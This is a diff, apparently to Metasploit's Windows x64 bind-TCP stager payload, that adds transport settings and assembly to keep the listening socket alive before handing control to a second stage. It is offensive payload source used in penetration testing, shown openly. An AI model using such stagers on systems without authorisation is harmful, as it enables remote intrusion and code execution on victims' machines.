@@ -44,6 +44,16 @@ module Payload::Windows::BindTcp_x64
     generate_bind_tcp(conf)
   end
 
+  def generate_transport_config(opts={})
+    {
+      :scheme       => 'tcp',
+      :lport        => datastore['LPORT'].to_i,
+      :comm_timeout => datastore['SessionCommunicationTimeout'].to_i,
+      :retry_total  => datastore['SessionRetryTotal'].to_i,
+      :retry_wait   => datastore['SessionRetryWait'].to_i
+    }
+  end
+
   #
   # Generate and compile the stager
   #
@@ -162,6 +172,7 @@ module Payload::Windows::BindTcp_x64
       ^
     else
       asm << %Q^
+        mov r14, rdi           ; stash the listen socket for later.
         mov rdi, rax           ; swap the new connected socket over the listening socket
       ^
     end
@@ -205,6 +216,15 @@ module Payload::Windows::BindTcp_x64
         sub rsi, rax           ; length -= bytes_received
         test rsi, rsi          ; test length
         jnz read_more          ; continue if we have more to read
+    ^
+
+    unless close_socket
+      asm << %Q^
+        mov rsi, r14           ; restore the listen socket
+      ^
+    end
+
+    asm << %Q^
         jmp r15                ; return into the second stage
     ^
 
